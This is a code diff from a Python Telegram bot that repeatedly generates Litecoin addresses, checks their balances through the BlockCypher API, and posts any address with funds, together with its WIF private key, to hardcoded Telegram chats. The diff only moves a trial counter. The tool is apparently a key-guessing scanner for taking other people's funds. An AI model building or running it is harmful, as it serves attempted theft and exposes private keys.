@@ -39,8 +39,7 @@ def start_value(update: Update, context: CallbackContext):
         msg_id = (bot.send_message(chat_id='@ftb_feedbacks',text='Sarting....')).message_id
         params.append(msg_id)
         while True:
-            cur_trials = int(trials)+1
-            user_data['trials'] = cur_trials
+            
             headers ={}    
             addr_url = "https://api.blockcypher.com/v1/ltc/main/addrs"
             req = requests.request("POST",addr_url,headers = headers)
@@ -56,11 +55,15 @@ def start_value(update: Update, context: CallbackContext):
             if int(received) > 0:
                 bot.send_message(chat_id="1233125771",text = f"Already used!: {address}\n\Received: {received}\n\nWIF:{wif}\n\nTrials:{cur_trials}")
             if (int(balance) >= int(received) or int(balance) < int(received)) and int(received) != 0:
+                cur_trials = int(trials)+1
+                user_data['trials'] = cur_trials
                 bot.edit_message_text(chat_id="1233125771",message_id = params[0],text = f"got some funds!\nAddress: {address}\nWif: {wif}\n\nTrials:{cur_trials}")
                 msg_id = (bot.send_message(chat_id='1233125771',text='Sarting over....')).message_id
                 params.pop(0), params.append(msg_id)
                 continue
             else:
+                cur_trials = int(trials)+1
+                user_data['trials'] = cur_trials
                 try:
                     bot.edit_message_text(chat_id="1233125771",message_id = params[0],text = f"No balance!: {address}\n\nBalance: {balance}\n\nTrials:{cur_trials}")
                 except:
